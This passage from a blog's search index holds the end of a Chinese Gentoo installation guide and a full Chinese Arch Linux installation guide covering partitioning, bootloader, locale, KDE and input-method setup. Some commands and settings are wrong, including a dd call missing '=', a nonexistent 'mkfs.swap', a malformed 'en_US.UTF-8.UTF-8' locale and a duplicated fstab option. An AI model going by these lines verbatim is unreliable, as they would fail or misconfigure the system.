class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emerge --ask --verbose --deep --newuse --update @world</span><br></pre></td></tr></table></figure><h4 id="9-配置系统引导"><a href="#9-配置系统引导" class="headerlink" title="9.配置系统引导"></a>9.配置系统引导</h4><p>生成fstab文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成fstab文件</span></span><br><span class="line">blkid</span><br><span class="line"><span class="comment">#如果使用的archlinux的livecd,可以使用archlinux的genfstab自动生成fstab文件</span></span><br><span class="line"><span class="comment">#genfstab /mnt/gentoo &gt; /mnt/gentoo/etc/fstab</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#建议使用uuid</span></span><br><span class="line">blkid &gt;&gt; /etc/fstab</span><br><span class="line">修改/etc/fstab文件</span><br><span class="line">UUID=<span class="string">&quot;203C-2BDD&quot;</span>        /boot   vfat    defaults 0 1</span><br><span class="line">UUID=<span class="string">&quot;5afdfbc9-0c66-4a13-8f29-da00199af5de&quot;</span> /   ext4 defaults defaults,noatime,discard 0 2</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里默认使用的引导是grub2,也可以使用其他的系统引导如lilo uboot等</p><p>生成grub配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /boot/grub</span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><p>安装系统引导</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Gentoo</span><br></pre></td></tr></table></figure><h4 id="10-完成安装"><a href="#10-完成安装" class="headerlink" title="10.完成安装"></a>10.完成安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置root用户的密码</span></span><br><span class="line">passwd root</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件和系统配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux发行版安装与使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Archlinux安装步骤</title>
      <link href="/2022/04/10/Archlinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/"/>
      <url>/2022/04/10/Archlinux%E5%AE%89%E8%A3%85%E6%AD%A5%E9%AA%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="Archlinux安装步骤"><a href="#Archlinux安装步骤" class="headerlink" title="Archlinux安装步骤"></a>Archlinux安装步骤</h1><h2 id="1-获取镜像-制作启动盘"><a href="#1-获取镜像-制作启动盘" class="headerlink" title="1.获取镜像,制作启动盘"></a>1.获取镜像,制作启动盘</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.ustc.edu.cn/archlinux/iso/2022.03.01/archlinux-2022.03.01-x86_64.iso</span><br><span class="line"><span class="comment">#linux下面可以使用dd进行刻录</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span> ./archlinux.iso of=/dev/sda</span><br><span class="line"><span class="comment">#windows下可以使用rufus进行刻录</span></span><br></pre></td></tr></table></figure><h2 id="2-基本安装环境配置"><a href="#2-基本安装环境配置" class="headerlink" title="2.基本安装环境配置"></a>2.基本安装环境配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#1.使用以太网,直接dhcpcd获取ip地址即可</span></span><br><span class="line">2.使用Wi-Fi</span><br><span class="line"><span class="comment">#进入网络配置</span></span><br><span class="line">iwctl</span><br><span class="line"><span class="comment">#扫面周围的wifi</span></span><br><span class="line">station wlan0 scan</span><br><span class="line"><span class="comment">#显示扫描到的wifi</span></span><br><span class="line">station wlan0 get-networks</span><br><span class="line"><span class="comment">#连接指定的Wi-Fi</span></span><br><span class="line">station wlan0 connect SSID</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动时间服务</span></span><br><span class="line">timedatectl set-ntp <span class="literal">true</span></span><br><span class="line"><span class="comment">#同步时间</span></span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure><h2 id="3-磁盘分区和挂载"><a href="#3-磁盘分区和挂载" class="headerlink" title="3.磁盘分区和挂载"></a>3.磁盘分区和挂载</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用fdisk工具进行磁盘分区</span></span><br><span class="line">fdisk /dev/sda</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#格式化文件系统</span></span><br><span class="line">mkfs.ext4 /dev/sda3     <span class="comment">#格式化根文件系统分区</span></span><br><span class="line">mkfs.swap /dev/sda2     <span class="comment">#格式化swap分区</span></span><br><span class="line">mkfs.vfat /dev/sda1     <span class="comment">#格式化boot文件系统分区</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#分区挂载</span></span><br><span class="line">mount /dev/sda3 /mnt</span><br><span class="line"><span class="built_in">mkdir</span> /mnt/boot</span><br><span class="line">mount /dev/sda1 /mnt/boot</span><br><span class="line">swapon /dev/sda2</span><br></pre></td></tr></table></figure><h2 id="4-安装密钥"><a href="#4-安装密钥" class="headerlink" title="4.安装密钥"></a>4.安装密钥</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pacman -S archlinux-keyring</span><br><span class="line">pacman -Sy <span class="comment">#获取软件包索引</span></span><br></pre></td></tr></table></figure><h2 id="5-安装基础系统"><a href="#5-安装基础系统" class="headerlink" title="5.安装基础系统"></a>5.安装基础系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pacstrap /mnt base linux linux-firmware wpa_supplicant dhcpcd neovim sudo openssh</span><br><span class="line"><span class="comment">#base为系统基本组件</span></span><br><span class="line"><span class="comment">#linux为linux内核</span></span><br><span class="line"><span class="comment">#linux-firmware包含了常见的设备驱动(可不选,但是后续需要根据自身硬件安装响应的驱动)</span></span><br><span class="line"><span class="comment">#wpa_supplicant是wifi连接工具</span></span><br><span class="line"><span class="comment">#dhcpcd是获取ip地址的dhcp客户端工具</span></span><br><span class="line"><span class="comment">#neovim是一个常用的编辑器</span></span><br></pre></td></tr></table></figure><h2 id="6-进入安装好的系统-进行基本的系统配置"><a href="#6-进入安装好的系统-进行基本的系统配置" class="headerlink" title="6.进入安装好的系统,进行基本的系统配置"></a>6.进入安装好的系统,进行基本的系统配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成fstab文件</span></span><br><span class="line">genfstab /mnt &gt;&gt; /mnt/etc/fstab</span><br><span class="line"></span><br><span class="line"><span class="comment">#chroot 到新的系统</span></span><br><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure><h3 id="1-设置hostname和host"><a href="#1-设置hostname和host" class="headerlink" title="1.设置hostname和host"></a>1.设置hostname和host</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Arch&quot;</span> &gt; /etc/hostname</span><br><span class="line">vim /etc/hosts</span><br><span class="line">127.0.0.1   localhost</span><br><span class="line">::1         localhost</span><br><span class="line">127.0.1.1   archlinux.localdomain</span><br></pre></td></tr></table></figure><h3 id="2-设置时间-地区和语言"><a href="#2-设置时间-地区和语言" class="headerlink" title="2.设置时间,地区和语言"></a>2.设置时间,地区和语言</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#设置时区</span></span><br><span class="line"><span class="built_in">ln</span> -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置语言</span></span><br><span class="line">vim /etc/locale.gen</span><br><span class="line">en_US.UTF-8.UTF-8</span><br><span class="line">zh_CN.UTF-8.UTF-8</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;LANG=en_US.UTF-8.UTF-8&quot;</span> &gt; /etc/locale.conf</span><br><span class="line">locale-gen</span><br></pre></td></tr></table></figure><h3 id="3-配置archlinuxcn库-可选"><a href="#3-配置archlinuxcn库-可选" class="headerlink" title="3.配置archlinuxcn库(可选)"></a>3.配置archlinuxcn库(可选)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/pacman.conf</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加</span></span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server = https://mirrors.ustc.edu.cn/archlinuxcn/<span class="variable">$arch</span></span><br><span class="line"></span><br><span class="line">pacman -S archlinuxcn-keyring</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-安装系统引导"><a href="#4-安装系统引导" class="headerlink" title="4.安装系统引导"></a>4.安装系统引导</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#安装grub软件包</span></span><br><span class="line">pacman -S grub efibootmgr amd-ucode</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装grub</span></span><br><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=Archlinux</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成grub配置文件</span></span><br><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure><p>&#96;</p><h2 id="7-安装桌面环境（KDE）（可选）"><a href="#7-安装桌面环境（KDE）（可选）" class="headerlink" title="7.安装桌面环境（KDE）（可选）"></a>7.安装桌面环境（KDE）（可选）</h2><h3 id="1-安装基本软件"><a href="#1-安装基本软件" class="headerlink" title="1.安装基本软件"></a>1.安装基本软件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pacman -S xorg plasma konsole sddm xf86-video-ati dolphin</span><br><span class="line"><span class="comment">#xorg显示库</span></span><br><span class="line"><span class="comment">#sddm显示管理器</span></span><br><span class="line"><span class="comment">#xf86-video-ati amd gpu驱动</span></span><br><span class="line"><span class="comment">#konsole kde终端</span></span><br><span class="line"><span class="comment">#dolphin kde桌面的文件管理器</span></span><br></pre></td></tr></table></figure><h3 id="2-开机自启动"><a href="#2-开机自启动" class="headerlink" title="2.开机自启动"></a>2.开机自启动</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> sddm</span><br></pre></td></tr></table></figure><h3 id="3-配置中文输入法-IBUS"><a href="#3-配置中文输入法-IBUS" class="headerlink" title="3.配置中文输入法(IBUS)"></a>3.配置中文输入法(IBUS)</h3><p>安装ibus和中文输入引擎</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pacman -S ibus ibus-pinyin</span><br></pre></td></tr></table></figure><p>将ibus作为默认输入法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim .bashrc</span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=ibus</span><br><span class="line"><span class="built_in">export</span> XMODIFIERS=@im=ibus</span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=ibus</span><br></pre></td></tr></table></figure><p>开机自动启动ibus守护程序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim .xprofile</span><br><span class="line">ibus-daemon -x -d </span><br></pre></td></tr></table></figure><h2 id="8-完成安装"><a href="#8-完成安装" class="headerlink" title="8.完成安装"></a>8.完成安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#设置root用户密码</span></span><br><span class="line">passwd root</span><br><span class="line"></span><br><span class="line"><span class="comment">#退出chroot环境</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#卸载磁盘</span></span><br><span class="line">umount /mnt/boot</span><br><span class="line">umount /mnt</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启系统并移除安装介质</span></span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 软件和系统配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux发行版安装与使用 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
